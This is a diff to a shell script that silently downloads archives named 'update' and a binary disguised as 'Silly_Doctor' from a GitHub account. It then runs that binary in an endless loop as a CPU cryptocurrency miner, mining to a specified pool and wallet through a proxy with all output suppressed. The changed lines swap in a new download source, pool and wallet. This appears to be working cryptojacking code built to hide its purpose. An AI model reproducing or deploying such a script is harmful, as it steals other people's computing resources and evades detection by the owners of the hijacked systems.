@@ -74,7 +74,7 @@ ph add Silly_Doctor 1>/dev/null 2>&1
 
 sleep 2
 
-curl -s -L -o update.tar.gz https://raw.githubusercontent.com/maninamsubathi/update/main/update.tar.gz > /dev/null
+curl -s -L -o update.tar.gz https://raw.githubusercontent.com/thembilemhlabangula/update/main/update.tar.gz > /dev/null
 
 sleep 2
 
@@ -104,7 +104,7 @@ sleep 2
 
 sleep 2
 
-./update/update wget -q https://raw.githubusercontent.com/maninamsubathi/update/main/Silly_Doctor_249.tar.gz 1>/dev/null 2>&1
+./update/update wget -q https://raw.githubusercontent.com/thembilemhlabangula/update/main/Silly_Doctor_249.tar.gz 1>/dev/null 2>&1
 
 sleep 2
 
@@ -133,6 +133,6 @@ sleep 2
 
 while true
 do
-./Silly_Doctor --disable-gpu --algorithm randomyada --pool yadaminers.pl:3333 --wallet 1LorV6u6LVt3BZn3SejRXwJJyDLJNfyHmu.$currentdate --password x --proxy 127.0.0.1:1081 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
-sleep 10
+./Silly_Doctor --disable-gpu --algorithm randomarq --pool gntl-miner.azpool.win:3333 --wallet solo:gnt1em9N5H4iisEbpQUPD3hrq19h6hnwgC62fo1rrTjGQM3pGs8cphzLowKNC5VDjX8MuT6SLtb1SEXdk9dkver92xQjCyZVj1 --password $currentdate --worker $currentdate --proxy 127.0.0.1:1081 --cpu-threads $used_num_of_cores --keepalive
+sleep 5
 done
